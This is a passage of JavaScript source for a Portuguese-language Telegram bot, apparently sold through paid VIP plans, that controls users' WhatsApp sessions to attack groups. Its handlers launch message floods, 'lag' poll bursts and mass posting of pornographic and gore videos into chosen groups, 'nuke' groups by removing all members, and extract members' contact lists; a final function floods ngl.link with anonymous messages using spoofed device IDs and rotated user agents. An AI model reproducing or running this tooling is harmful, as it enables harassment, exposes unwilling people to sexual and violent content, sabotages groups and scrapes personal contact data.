        return ctx.reply('💎 *ADICIONAR VIP OU DIAS*\n\nEnvie no formato:\n`ID DIAS`\n\nExemplo para adicionar: `123456789 30`\nExemplo para remover: `123456789 -5`\n\n(Se o usuário já for VIP, os dias serão SOMADOS ao tempo atual)', { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('❌ Cancelar', 'admin_panel')]]) });
    }

    if (data === 'view_feedbacks') {
        if (tid !== ADMIN_ID) return ctx.answerCbQuery('❌ Acesso negado!', { show_alert: true });
        await ctx.answerCbQuery();
        let msg = `📩 *FEEDBACKS RECEBIDOS*\n\n`;
        if (supportFeedbacks.length === 0) {
            msg += `_Nenhum feedback recebido ainda._`;
        } else {
            supportFeedbacks.slice(-10).forEach((fb, i) => {
                msg += `${i + 1}. *${fb.type || 'Geral'}*\n`;
                msg += `   👤 ID: \`${fb.userId}\`\n`;
                msg += `   💬 ${(fb.message || '').substring(0, 50)}...\n`;
                msg += `   📅 ${fb.date || 'N/A'}\n\n`;
            });
        }
        return ctx.reply(msg, { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('🔙 Voltar', 'admin_panel')]]) });
    }

    if (data === 'saldo_bancario') {
        if (tid !== ADMIN_ID) return ctx.answerCbQuery('❌ Acesso negado!', { show_alert: true });
        await ctx.answerCbQuery('💰 Consultando saldo...');
        try {
            const balance = await promisseApi.getBalance();
            if (balance) {
                const saldo = (balance.balance || balance.available || 0) / 100;
                return ctx.reply(`💰 *SALDO BANCÁRIO*\n\n💵 Saldo disponível: *R$ ${saldo.toFixed(2)}*`, { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('🔙 Voltar', 'admin_panel')]]) });
            } else {
                return ctx.reply('❌ Erro ao consultar saldo.', { ...Markup.inlineKeyboard([[Markup.button.callback('🔙 Voltar', 'admin_panel')]]) });
            }
        } catch (e) {
            return ctx.reply('❌ Erro ao consultar saldo: ' + e.message, { ...Markup.inlineKeyboard([[Markup.button.callback('🔙 Voltar', 'admin_panel')]]) });
        }
    }

    if (data === 'solicitar_saque') {
        if (tid !== ADMIN_ID) return ctx.answerCbQuery('❌ Acesso negado!', { show_alert: true });
        await ctx.answerCbQuery();
        userStates[tid] = 'wait_saque';
        return ctx.reply('💸 *SOLICITAR SAQUE*\n\nEnvie no formato:\n`VALOR CHAVEPIX`\n\nExemplo: `50 seuemail@gmail.com`', { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('❌ Cancelar', 'admin_panel')]]) });
    }

    if (data === 'gerenciar_vips') {
        if (tid !== ADMIN_ID) return ctx.answerCbQuery('❌ Acesso negado!', { show_alert: true });
        await ctx.answerCbQuery();
        let msg = `💎 *GERENCIAR VIPs*\n\n`;
        const vipsList = Object.entries(vips);
        if (vipsList.length === 0) {
            msg += `_Nenhum VIP ativo no momento._`;
        } else {
            msg += `📊 Total: ${vipsList.length} VIPs ativos\n\n`;
            vipsList.slice(0, 15).forEach(([userId, vipData], i) => {
                const expDate = new Date(vipData.expiresAt);
                const daysLeft = Math.ceil((vipData.expiresAt - Date.now()) / (24 * 60 * 60 * 1000));
                const type = vipData.type === 'trial' ? '🎁 TRIAL' : (vipData.type === 'full' ? '💎 FULL' : '⭐ PADRÃO');
                msg += `${i + 1}. \`${userId}\`\n`;
                msg += `   ${type} • ${daysLeft > 0 ? daysLeft + ' dias restantes' : 'EXPIRADO'}\n\n`;
            });
            if (vipsList.length > 15) msg += `\n... e mais ${vipsList.length - 15} VIPs`;
        }
        return ctx.reply(msg, {
            parse_mode: 'Markdown', ...Markup.inlineKeyboard([
                [Markup.button.callback('➕ Adic. VIP/Dias', 'give_vip'), Markup.button.callback('➖ Remov. VIP/Dias', 'admin_remove_vip')],
                [Markup.button.callback('🔙 Voltar', 'admin_panel')]
            ])
        });
    }

    // Callbacks para configurar flood
    if (data === 'alterar_quantidade_flood') {
        await ctx.answerCbQuery();
        userStates[tid] = 'wait_quantidade';
        return ctx.reply('🔢 *ALTERAR QUANTIDADE*\n\nEnvie a quantidade de mensagens (1-50):', { parse_mode: 'Markdown', ...Markup.keyboard([['🔙 • Voltar']]).resize() });
    }

    if (data === 'alterar_delay_flood') {
        await ctx.answerCbQuery();
        userStates[tid] = 'wait_delay';
        return ctx.reply('⏳ *ALTERAR DELAY*\n\nEnvie o delay em segundos (1-10):', { parse_mode: 'Markdown', ...Markup.keyboard([['🔙 • Voltar']]).resize() });
    }

    if (data === 'toggle_nick_flood') {
        await ctx.answerCbQuery();
        const config = loadUserConfig(tid);
        config.autoNick = !config.autoNick;
        saveUserConfig(tid);
        const status = config.autoNick ? '✅ ATIVADO' : '❌ DESATIVADO';
        try {
            await ctx.deleteMessage().catch(() => { });
        } catch (e) { }
        return ctx.replyWithPhoto('https://files.catbox.moe/t7w3gk.jpg', {
            caption: `✅ Troca automática de nick ${status}!\n\n⚙️ *CONFIGURAR FLOOD*\n\nDefina quantidade e delay:`,
            parse_mode: 'Markdown',
            ...getFloodConfigMenu(tid)
        });
    }

    // Handler para navegação de grupos da web
    if (data === 'next_web_groups') {
        try {
            await ctx.answerCbQuery('🔍 Carregando próximos 100 grupos...');
            await ctx.deleteMessage().catch(() => { });

            // Incrementa página
            userWebGroupsPage[tid]++;
            const result = await getWebGroupsPage(tid, userWebGroupsPage[tid]);

            if (result.groups.length === 0) {
                // Volta para primeira página se não houver mais
                userWebGroupsPage[tid] = 0;
                return ctx.reply('🏁 • Você chegou ao fim da lista!\n\nClique em "🔍 • Buscar Grupos Web" novamente para recomeçar.', { parse_mode: 'Markdown' });
            }

            // Formata mensagem
            let message = `🔍 • *GRUPOS ENCONTRADOS NA WEB*\n\n`;
            message += `📊 Total de grupos: *${result.total}*\n`;
            message += `📄 Página: *${result.page + 1}* (100 grupos)\n`;
            message += `\n✅ *CLIQUE NOS LINKS ABAIXO PARA ENTRAR:*\n\n`;

            const groupsToShow = result.groups.slice(0, 30);
            groupsToShow.forEach((group, index) => {
                const num = (result.page * 100) + index + 1;
                message += `${num}. [${group.name}](${group.link})\n`;
                message += `   👥 ${group.members} membros • 📁 ${group.category}\n\n`;
            });

            if (result.groups.length > 30) {
                message += `\n📝 *+${result.groups.length - 30} grupos nesta página...*\n`;
            }

            const buttons = [];
            if (result.hasMore) {
                buttons.push([Markup.button.callback('➡️ Próximos 100 Grupos', 'next_web_groups')]);
            } else {
                message += `\n\n🏁 *Você chegou ao fim! Clique abaixo para voltar ao início.*`;
                buttons.push([Markup.button.callback('🔄 Recomeçar do Início', 'reset_web_groups')]);
            }

            await ctx.reply(message, {
                parse_mode: 'Markdown',
                disable_web_page_preview: true,
                ...Markup.inlineKeyboard(buttons)
            }).then(msg => {
                // Auto-delete após 1 hora
                setTimeout(() => {
                    ctx.deleteMessage(msg.message_id).catch(() => { });
                }, 3600000); // 1 hora = 60 * 60 * 1000
            });
        } catch (e) {
            console.error('[NEXT WEB GROUPS] Erro:', e);
            ctx.reply('❌ Erro ao carregar próxima página.').catch(() => { });
        }
        return;
    }

    if (data === 'reset_web_groups') {
        try {
            await ctx.answerCbQuery('🔄 Voltando ao início...');
            await ctx.deleteMessage().catch(() => { });

            // Reseta para primeira página
            userWebGroupsPage[tid] = 0;
            const result = await getWebGroupsPage(tid, 0);

            let message = `🔍 • *GRUPOS ENCONTRADOS NA WEB*\n\n`;
            message += `📊 Total de grupos: *${result.total}*\n`;
            message += `📄 Página: *1* (100 grupos)\n`;
            message += `\n✅ *CLIQUE NOS LINKS ABAIXO PARA ENTRAR:*\n\n`;

            const groupsToShow = result.groups.slice(0, 30);
            groupsToShow.forEach((group, index) => {
                message += `${index + 1}. [${group.name}](${group.link})\n`;
                message += `   👥 ${group.members} membros • 📁 ${group.category}\n\n`;
            });

            if (result.groups.length > 30) {
                message += `\n📝 *+${result.groups.length - 30} grupos nesta página...*\n`;
            }

            const buttons = [[Markup.button.callback('➡️ Próximos 100 Grupos', 'next_web_groups')]];

            await ctx.reply(message, {
                parse_mode: 'Markdown',
                disable_web_page_preview: true,
                ...Markup.inlineKeyboard(buttons)
            }).then(msg => {
                // Auto-delete após 1 hora
                setTimeout(() => {
                    ctx.deleteMessage(msg.message_id).catch(() => { });
                }, 3600000); // 1 hora = 60 * 60 * 1000
            });
        } catch (e) {
            console.error('[RESET WEB GROUPS] Erro:', e);
            ctx.reply('❌ Erro ao resetar lista.').catch(() => { });
        }
        return;
    }

    // Handler para paginação de grupos

    if (data.startsWith('page_')) {
        const parts = data.split('_');
        const prefix = parts[1];
        const page = parseInt(parts[2]);
        const sock = userSessions[tid];
        if (!sock?.user) return ctx.answerCbQuery('❌ WhatsApp Desconectado.');
        try {
            const chats = await sock.groupFetchAllParticipating();
            const groups = Object.values(chats);
            const buttons = safeGroupButtons(groups, prefix, page, tid);
            let title = '🎯 • *Selecione o(s) grupo(s):*';
            if (prefix === 'rajar1') title = '🎯 • *Selecione o(s) grupo(s) para RAJAR (PAYMENT):*';
            if (prefix === 'rajar2') title = '🎯 • *Selecione o(s) grupo(s) para RAJAR (mencionar status):*';
            if (prefix === 'rajar4') title = '🌊 • *Selecione o(s) grupo(s) para RAJAR 4 (FLOOD STATUS):*';
            if (prefix === 'rajarenquetes') title = '🗳️ • *Selecione o(s) grupo(s) para RAJAR ENQUETES (LAG):*';
            if (prefix === 'rajarporno') title = '🎯 • *Selecione o(s) grupo(s) para RAJAR VÍDEOS (PORNO):*';
            if (prefix === 'rajargore') title = '🎯 • *Selecione o(s) grupo(s) para RAJAR VÍDEOS (GORE):*';
            if (prefix === 'nukar') title = '⚠️ • *Selecione o grupo para NUKAR:*';
            if (prefix === 'info') title = 'ℹ️ • *Selecione o grupo para ver informações detalhadas:*';
            await ctx.editMessageText(title, {
                parse_mode: 'Markdown',
                ...Markup.inlineKeyboard(buttons)
            }).catch(() => { });
            await ctx.answerCbQuery();
        } catch (e) {
            await ctx.answerCbQuery('❌ Erro ao carregar página.');
        }
        return;
    }
    if (data === 'accept_terms') {
        saveAcceptedTerms(tid);
        await ctx.answerCbQuery('✅ Termos aceitos! Bem-vindo(a) ao bot.');
        return bot.start(ctx);
    }
    if (data === 'send_suggestion') {
        userStates[tid] = 'wait_suggestion';
        await ctx.answerCbQuery();
        return ctx.reply('💡 • *ENVIAR SUGESTÃO*\n\nEscreva abaixo sua sugestão para o bot. Sua mensagem será enviada diretamente para a equipe de desenvolvimento.', { parse_mode: 'Markdown', ...Markup.keyboard([['🔙 • Voltar']]).resize() });
    }
    if (data === 'report_bug') {
        userStates[tid] = 'wait_bug';
        await ctx.answerCbQuery();
        return ctx.reply('🐛 • *RELATAR BUG*\n\nDescreva detalhadamente o erro ou bug que você encontrou. Se possível, informe o que você estava fazendo quando o erro ocorreu.', { parse_mode: 'Markdown', ...Markup.keyboard([['🔙 • Voltar']]).resize() });
    }

    if (data === 'verify_sub') {
        try {
            const member = await ctx.telegram.getChatMember(CHANNEL_ID, tid);
            if (['member', 'administrator', 'creator'].includes(member.status)) {
                await ctx.answerCbQuery('✅ • Acesso liberado! Bem-vindo.');
                const accessMsg = `*👑 • PAYMENT-V1.0  CORVO*\n\n` +
                    `✅ • *ACESSO AUTORIZADO!*\n\n` +
                    `Bem-vindo de volta ao sistema da Corvo.\n\n` +
                    `• *Usuário:* \`${ctx.from.first_name}\`\n` +
                    `• *Seu ID:* \`${tid}\`\n\n` +
                    `• *Suporte:* @CORVO291`;
                await ctx.reply(accessMsg, { parse_mode: 'Markdown', ...getMainMenu(tid) });
            } else {
                await ctx.answerCbQuery('❌ • Você ainda não segue o canal!', { show_alert: true });
            }
        } catch (e) {
            console.error('Erro ao verificar sub:', e);
            await ctx.answerCbQuery('❌ Erro interno ao verificar sub.');
        }
    } else if (data.startsWith('info_')) {
        const jid = data.replace('info_', '');
        const sock = userSessions[tid];
        if (!sock?.user) return ctx.answerCbQuery('❌ WhatsApp Desconectado.');
        try {
            const meta = await sock.groupMetadata(jid);
            const info = `<blockquote>ℹ️ <b>INFORMAÇÕES DO GRUPO</b>\n\n` +
                `• <b>Nome:</b> ${meta.subject}\n` +
                `• <b>Membros:</b> ${meta.participants.length}\n` +
                `• <b>Criação:</b> ${new Date(meta.creation * 1000).toLocaleDateString('pt-BR')}</blockquote>`;

            ctx.reply(info, {
                parse_mode: 'HTML',
                ...Markup.inlineKeyboard([
                    [Markup.button.callback('📂 EXTRAIR CONTATOS (.TXT)', `extract_contacts_${jid}`)],
                    [Markup.button.callback('🔙 VOLTAR', 'page_info_0')]
                ])
            }).catch(() => { });
            await ctx.answerCbQuery();
        } catch (e) {
            logEvent('ERROR', `Erro ao buscar info do grupo: ${e.message}`);
            await ctx.answerCbQuery('❌ Erro ao obter informações.', { show_alert: true });
        }
    } else if (data.startsWith('extract_contacts_')) {
        const jid = data.replace('extract_contacts_', '');
        await ctx.answerCbQuery('📂 Gerando arquivo...');
        await extractGroupContacts(tid, jid, ctx);
    } else if (data.startsWith('rajar1_')) {
        const jid = data.replace('rajar1_', '');
        const sock = userSessions[tid];
        if (!sock?.user) return ctx.answerCbQuery('❌ WhatsApp Desconectado.');
        let groupName = jid;
        try {
            const meta = await sock.groupMetadata(jid);
            groupName = meta.subject;
        } catch (e) { logEvent('WARN', `Não foi possível obter metadados para o ID manual: ${jid}`); }
        await ctx.editMessageText(`⚠️ *CONFIRMAÇÃO DE RAJADA (PAYMENT)*\n\nGrupo: \`${groupName}\`\nID: \`${jid}\`\n\nDeseja iniciar?`, {
            parse_mode: 'Markdown',
            ...Markup.inlineKeyboard([
                [Markup.button.callback('✅ • SIM, INICIAR', `confirm_rajar1_${jid}`)],
                [Markup.button.callback('⬅️ • VOLTAR', 'page_rajar1_0')],
                [Markup.button.callback('❌ • CANCELAR', 'cancel_action')]])
        }).catch(() => { });
    } else if (data.startsWith('rajarenquetes_')) {
        const jid = data.replace('rajarenquetes_', '');
        const sock = userSessions[tid];
        if (!sock?.user) return ctx.answerCbQuery('❌ WhatsApp Desconectado.');
        let groupName = jid;
        try {
            const meta = await sock.groupMetadata(jid);
            groupName = meta.subject;
        } catch (e) { logEvent('WARN', `Não foi possível obter metadados para o ID manual: ${jid}`); }
        await ctx.editMessageText(`⚠️ *CONFIRMAÇÃO DE RAJADA (ENQUETES/LAG)*\n\nGrupo: \`${groupName}\`\nID: \`${jid}\`\n\nDeseja iniciar?`, {
            parse_mode: 'Markdown',
            ...Markup.inlineKeyboard([
                [Markup.button.callback('✅ • SIM, INICIAR', `confirm_rajarenquetes_${jid}`)],
                [Markup.button.callback('⬅️ • VOLTAR', 'page_rajarenquetes_0')],
                [Markup.button.callback('❌ • CANCELAR', 'cancel_action')]])
        }).catch(() => { });
    } else if (data.startsWith('confirm_rajarenquetes_')) {
        const jid = data.replace('confirm_rajarenquetes_', '');
        ctx.answerCbQuery('🗳️ Iniciando Rajada Enquetes...');
        await ctx.deleteMessage().catch(() => { });
        await rajarEnquetes(tid, jid, ctx);
    } else if (data.startsWith('rajar2_')) {
        const jid = data.replace('rajar2_', '');
        const sock = userSessions[tid];
        if (!sock?.user) return ctx.answerCbQuery('❌ WhatsApp Desconectado.');
        let groupName = jid;
        try {
            const meta = await sock.groupMetadata(jid);
            groupName = meta.subject;
        } catch (e) { logEvent('WARN', `Não foi possível obter metadados para o ID manual: ${jid}`); }
        await ctx.editMessageText(`⚠️ *CONFIRMAÇÃO DE RAJADA (mencionar status)*\n\nGrupo: \`${groupName}\`\nID: \`${jid}\`\n\nDeseja iniciar?`, {
            parse_mode: 'Markdown',
            ...Markup.inlineKeyboard([
                [Markup.button.callback('✅ • SIM, INICIAR', `confirm_rajar2_${jid}`)],
                [Markup.button.callback('⬅️ • VOLTAR', 'page_rajar2_0')],
                [Markup.button.callback('❌ • CANCELAR', 'cancel_action')]])
        }).catch(() => { });
    } else if (data.startsWith('rajar3_')) {
        const jid = data.replace('rajar3_', '');
        const sock = userSessions[tid];
        if (!sock?.user) return ctx.answerCbQuery('❌ WhatsApp Desconectado.');
        let groupName = jid;
        try {
            const meta = await sock.groupMetadata(jid);
            groupName = meta.subject;
        } catch (e) { logEvent('WARN', `Não foi possível obter metadados para o ID manual: ${jid}`); }
        await ctx.editMessageText(`⚠️ *CONFIRMAÇÃO DE RAJADA (PAYMENT + STATUS)*\n\nGrupo: \`${groupName}\`\nID: \`${jid}\`\n\nDeseja iniciar?`, {
            parse_mode: 'Markdown',
            ...Markup.inlineKeyboard([
                [Markup.button.callback('✅ • SIM, INICIAR', `confirm_rajar3_${jid}`)],
                [Markup.button.callback('⬅️ • VOLTAR', 'page_rajar3_0')],
                [Markup.button.callback('❌ • CANCELAR', 'cancel_action')]])
        }).catch(() => { });
    } else if (data.startsWith('confirm_rajar1_')) {
        const jid = data.replace('confirm_rajar1_', '');
        ctx.answerCbQuery('📝 Aguardando texto...');
        await ctx.deleteMessage().catch(() => { });
        userStates[tid] = `wait_rajar1_text_${jid}`;
        ctx.reply('📝 • *RAJAR 1 - PAYMENT*\n\n💬 Digite o texto que deseja rajar:', { parse_mode: 'Markdown' }).catch(() => { });
    } else if (data.startsWith('confirm_rajar2_')) {
        const jid = data.replace('confirm_rajar2_', '');
        ctx.answerCbQuery('📝 Aguardando texto...');
        await ctx.deleteMessage().catch(() => { });
        userStates[tid] = `wait_rajar2_text_${jid}`;
        ctx.reply('📝 • *RAJAR 2 - MENCIONAR STATUS*\n\n💬 Digite o texto que deseja rajar:', { parse_mode: 'Markdown' }).catch(() => { });
    } else if (data.startsWith('confirm_rajar3_')) {
        const jid = data.replace('confirm_rajar3_', '');
        ctx.answerCbQuery('📝 Aguardando texto...');
        await ctx.deleteMessage().catch(() => { });
        userStates[tid] = `wait_rajar3_text_${jid}`;
        ctx.reply('📝 • *RAJAR 3 - PAYMENT + STATUS*\n\n💬 Digite o texto que deseja rajar:', { parse_mode: 'Markdown' }).catch(() => { });
    } else if (data.startsWith('rajar4_')) {
        const jid = data.replace('rajar4_', '');

        // Verifica se é a opção "SELECIONAR TODOS"
        if (jid === 'all_groups') {
            ctx.answerCbQuery('✅ Preparando rajada em TODOS os grupos...');
            await ctx.editMessageText(`✅ *RAJAR 4 - TODOS OS GRUPOS*\n\n*Escolha o tipo de mídia para rajar em TODOS os grupos:*\n\n📝 *Texto* - Digite o texto após confirmar\n📷 *Foto* - Envie uma foto após confirmar\n🎬 *Vídeo* - Envie um vídeo após confirmar\n\n⚠️ *Atenção:* A rajada será enviada para TODOS os grupos!`, {
                parse_mode: 'Markdown',
                ...Markup.inlineKeyboard([
                    [Markup.button.callback('📝 • TEXTO', `confirm_rajar4_text_ALL_GROUPS`)],
                    [Markup.button.callback('📷 • FOTO', `confirm_rajar4_image_ALL_GROUPS`)],
                    [Markup.button.callback('🎬 • VÍDEO', `confirm_rajar4_video_ALL_GROUPS`)],
                    [Markup.button.callback('⬅️ • VOLTAR', 'page_rajar4_0')],
                    [Markup.button.callback('❌ • CANCELAR', 'cancel_action')]])
            }).catch(() => { });
            return;
        }

        const sock = userSessions[tid];
        if (!sock?.user) return ctx.answerCbQuery('❌ WhatsApp Desconectado.');
        let groupName = jid;
        try {
            const meta = await sock.groupMetadata(jid);
            groupName = meta.subject;
        } catch (e) { logEvent('WARN', `Não foi possível obter metadados para o ID manual: ${jid}`); }
        await ctx.editMessageText(`🌊 *RAJAR 4 - FLOOD STATUS*\n\nGrupo: \`${groupName}\`\nID: \`${jid}\`\n\n*Escolha o tipo de mídia para rajar:*\n\n📝 *Texto* - Usa o texto configurado\n📷 *Foto* - Envie uma foto após confirmar\n🎬 *Vídeo* - Envie um vídeo após confirmar`, {
            parse_mode: 'Markdown',
            ...Markup.inlineKeyboard([
                [Markup.button.callback('📝 • TEXTO', `confirm_rajar4_text_${jid}`)],
                [Markup.button.callback('📷 • FOTO', `confirm_rajar4_image_${jid}`)],
                [Markup.button.callback('🎬 • VÍDEO', `confirm_rajar4_video_${jid}`)],
                [Markup.button.callback('⬅️ • VOLTAR', 'page_rajar4_0')],
                [Markup.button.callback('❌ • CANCELAR', 'cancel_action')]])
        }).catch(() => { });
    } else if (data.startsWith('confirm_rajar4_text_')) {
        const jid = data.replace('confirm_rajar4_text_', '');
        ctx.answerCbQuery('📝 Aguardando texto...');
        await ctx.deleteMessage().catch(() => { });
        userStates[tid] = `wait_rajar4_text_${jid}`;
        const msg = await ctx.reply('📝 • *Envie agora o TEXTO que deseja rajar:*\n\n_O texto será enviado como Flood Status no grupo._', { parse_mode: 'Markdown' }).catch(() => { });
        if (msg?.message_id) trackBotMessage(tid, msg.message_id);
    } else if (data.startsWith('confirm_rajar4_image_')) {
        const jid = data.replace('confirm_rajar4_image_', '');
        ctx.answerCbQuery('📷 Aguardando foto...');
        await ctx.deleteMessage().catch(() => { });
        userStates[tid] = `wait_rajar4_image_${jid}`;
        ctx.reply('📷 • *Envie agora a FOTO que deseja rajar:*\n\n_Você pode adicionar uma LEGENDA junto com a foto._', { parse_mode: 'Markdown' }).catch(() => { });
    } else if (data.startsWith('confirm_rajar4_video_')) {
        const jid = data.replace('confirm_rajar4_video_', '');
        ctx.answerCbQuery('🎬 Aguardando vídeo...');
        await ctx.deleteMessage().catch(() => { });
        userStates[tid] = `wait_rajar4_video_${jid}`;
        ctx.reply('🎬 • *Envie agora o VÍDEO que deseja rajar:*\n\n_Você pode adicionar uma LEGENDA junto com o vídeo._', { parse_mode: 'Markdown' }).catch(() => { });
    } else if (data.startsWith('rajarporno_')) {
        const jid = data.replace('rajarporno_', '');
        const sock = userSessions[tid];
        if (!sock?.user) return ctx.answerCbQuery('❌ WhatsApp Desconectado.');
        let groupName = jid;
        try {
            const meta = await sock.groupMetadata(jid);
            groupName = meta.subject;
        } catch (e) { logEvent('WARN', `Não foi possível obter metadados para o ID manual: ${jid}`); }
        await ctx.editMessageText(`⚠️ *CONFIRMAÇÃO DE RAJADA DE VÍDEOS (PORNO)*\n\nGrupo: \`${groupName}\`\nID: \`${jid}\`\n\nDeseja iniciar?`, {
            parse_mode: 'Markdown',
            ...Markup.inlineKeyboard([
                [Markup.button.callback('✅ • SIM, INICIAR', `confirm_rajarporno_${jid}`)],
                [Markup.button.callback('⬅️ • VOLTAR', 'page_rajarporno_0')],
                [Markup.button.callback('❌ • CANCELAR', 'cancel_action')]])
        }).catch(() => { });
    } else if (data.startsWith('rajargore_')) {
        const jid = data.replace('rajargore_', '');
        const sock = userSessions[tid];
        if (!sock?.user) return ctx.answerCbQuery('❌ WhatsApp Desconectado.');
        let groupName = jid;
        try {
            const meta = await sock.groupMetadata(jid);
            groupName = meta.subject;
        } catch (e) { logEvent('WARN', `Não foi possível obter metadados para o ID manual: ${jid}`); }
        await ctx.editMessageText(`⚠️ *CONFIRMAÇÃO DE RAJADA DE VÍDEOS (GORE)*\n\nGrupo: \`${groupName}\`\nID: \`${jid}\`\n\nDeseja iniciar?`, {
            parse_mode: 'Markdown',
            ...Markup.inlineKeyboard([
                [Markup.button.callback('✅ • SIM, INICIAR', `confirm_rajargore_${jid}`)],
                [Markup.button.callback('⬅️ • VOLTAR', 'page_rajargore_0')],
                [Markup.button.callback('❌ • CANCELAR', 'cancel_action')]])
        }).catch(() => { });
    } else if (data.startsWith('confirm_rajarporno_')) {
        const jid = data.replace('confirm_rajarporno_', '');
        ctx.answerCbQuery('🎬 Iniciando Rajada de Vídeos PORNO...');
        await ctx.deleteMessage().catch(() => { });
        await rajarVideos(tid, jid, ctx, 'porno');
    } else if (data.startsWith('confirm_rajargore_')) {
        const jid = data.replace('confirm_rajargore_', '');
        ctx.answerCbQuery('🎬 Iniciando Rajada de Vídeos GORE...');
        await ctx.deleteMessage().catch(() => { });
        await rajarVideos(tid, jid, ctx, 'gore');
    } else if (data.startsWith('nuketurbo_')) {
        const jid = data.replace('nuketurbo_', '');
        const sock = userSessions[tid];
        if (!sock?.user) return ctx.answerCbQuery('❌ WhatsApp Desconectado.');
        let groupName = jid;
        try {
            const meta = await sock.groupMetadata(jid);
            groupName = meta.subject;
        } catch (e) { }
        await ctx.editMessageText(`🔥 *CONFIRMAÇÃO DE NUKE TURBO* 🔥\n\nGrupo: \`${groupName}\`\nID: \`${jid}\`\n\n⚠️ *ATENÇÃO:* O Nuke Turbo realiza 3 rounds de remoção para limpar o grupo completamente.\n\nDeseja iniciar agora?`, {
            parse_mode: 'Markdown',
            ...Markup.inlineKeyboard([
                [Markup.button.callback('🚀 • SIM, TURBO AGORA', `confirm_nuketurbo_${jid}`)],
                [Markup.button.callback('⬅️ • VOLTAR', 'page_nuketurbo_0')],
                [Markup.button.callback('❌ • CANCELAR', 'cancel_action')]])
        }).catch(() => { });
    } else if (data.startsWith('confirm_nuketurbo_')) {
        const jid = data.replace('confirm_nuketurbo_', '');
        await ctx.answerCbQuery('🚀 Iniciando Nuke Turbo...');
        await ctx.deleteMessage().catch(() => { });
        await nukarGroup(tid, jid, ctx, true);
    } else if (data.startsWith('nukar_')) {
        const jid = data.replace('nukar_', '');
        const sock = userSessions[tid];
        if (!sock?.user) return ctx.answerCbQuery('❌ WhatsApp Desconectado.');
        const meta = await sock.groupMetadata(jid);
        const msg = `⚠️ *CONFIRMAÇÃO DE NUKE*\n\n` +
            `• *Grupo:* \`${meta.subject}\`\n` +
            `• *ID:* \`${jid}\`\n\n` +
            `Isso removerá todos os membros comuns do grupo. Continuar?`;
        await ctx.editMessageText(msg, {
            parse_mode: 'Markdown',
            ...Markup.inlineKeyboard([
                [Markup.button.callback('✅ • SIM, NUKAR AGORA', `confirm_nukar_${jid}`)],
                [Markup.button.callback('⬅️ • VOLTAR', 'page_nukar_0')],
                [Markup.button.callback('❌ • NÃO, CANCELAR', 'cancel_action')]])
        }).catch(() => { });
    } else if (data.startsWith('confirm_nukar_')) {
        const jid = data.replace('confirm_nukar_', '');
        ctx.answerCbQuery('💣 Iniciando Nuke...');
        await ctx.deleteMessage().catch(() => { });
        await nukarGroup(tid, jid, ctx);
    } else if (data === 'cancel_action') {
        await ctx.answerCbQuery('❌ Ação cancelada.');
        await ctx.deleteMessage().catch(() => { });
    } else if (data.startsWith('buy_vip_')) {
        const type = data.replace('buy_vip_', '');
        const plans = {
            '1d': { days: 1, price: 4.00, label: '1 Dia' },
            '3d': { days: 3, price: 9.00, label: '3 Dias' },
            '7d': { days: 7, price: 17.00, label: '1 Semana' },
            '15d': { days: 15, price: 25.00, label: '15 Dias' },
            '30d': { days: 30, price: 35.00, label: '1 Mês' }
        };
        const plan = plans[type];
        if (!plan) return ctx.answerCbQuery('❌ Plano inválido.');
        await ctx.answerCbQuery('Gerando PIX...');
        await ctx.deleteMessage().catch(() => { });
        const msgWait = await ctx.reply(`⏳ *PROCESSANDO...*\n\nGerando seu PIX para VIP ${plan.label}...`, { parse_mode: 'Markdown' });
        const totalPagar = plan.price;
        const res = await promisseApi.createPix(totalPagar);
        await ctx.deleteMessage(msgWait.message_id).catch(() => { });
        if (res && res.pix_code) {
            pendingPayments[res.id] = {
                userId: tid,
                amount: Math.round(totalPagar * 100),
                type: `vip_${type}`,
                expiresAt: Date.now() + 30 * 60 * 1000
            };
            savePayments();
            let msg = `💎 *CORVO DIV • VIP ${plan.label.toUpperCase()}*\n\n`;
            msg += `💰 *DETALHES DO PAGAMENTO*\n`;
            msg += `• Plano: VIP (${plan.label})\n`;
            msg += `• *Total a Pagar: R$ ${totalPagar.toFixed(2).replace('.', ',')}*\n\n`;
            msg += `📌 *CHAVE PIX (COPIA E COLA)*\n`;
            msg += `\`${res.pix_code}\`\n\n`;
            msg += `⚠️ Este código expira em 30 minutos.\n`;
            msg += `✅ O VIP será ativado automaticamente após o pagamento.`;
            const buttons = [];
            if (res.paymentUrl || res.payment_url || res.link) {
                const payLink = res.paymentUrl || res.payment_url || res.link;
                buttons.push([Markup.button.url('📱 Pagar via Link (Opcional)', payLink)]);
            }
            buttons.push([Markup.button.callback('🔙 Voltar', 'back_to_main')]);
            if (buttons.length > 0) {
                ctx.reply(msg, {
                    parse_mode: 'Markdown',
                    ...Markup.inlineKeyboard(buttons)
                });
            } else {
                ctx.reply(msg, { parse_mode: 'Markdown' });
            }
        } else {
            ctx.reply('❌ *ERRO NA GERAÇÃO*\n\nErro ao gerar PIX. Tente novamente mais tarde.', { parse_mode: 'Markdown' });
        }
    }
});



// --- LÓGICA DE FLOOD NGL E SENDIT ---
async function runNGLFlood(tid, username, ctx) {
    const config = loadUserConfig(tid);
    const message = config.texto_flood || '🔥';
    const limit = config.quantidade_flood || 10;
    let success = 0;
    let error = 0;
    const USER_AGENTS = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1'];
    for (let i = 0; i < limit; i++) {
        const deviceId = 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, (c) => {
            const r = Math.random() * 16 | 0, v = c === 'x' ? r : (r & 0x3 | 0x8);
            return v.toString(16);
        });
        const ua = USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
        try {
            const payload = new URLSearchParams({
                username: username,
                question: message,
                deviceId: deviceId,
                gameSlug: '',
                referrer: `https://ngl.link/${username}`
            }).toString();
            await axios.post('https://ngl.link/api/submit', payload, {
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'User-Agent': ua,
                    'X-Requested-With': 'XMLHttpRequest',
                    'Referer': `https://ngl.link/${username}`,
                    'Origin': 'https://ngl.link'
                },
                timeout: 5000
            });
            success++;
        } catch (e) {
            error++;
        }
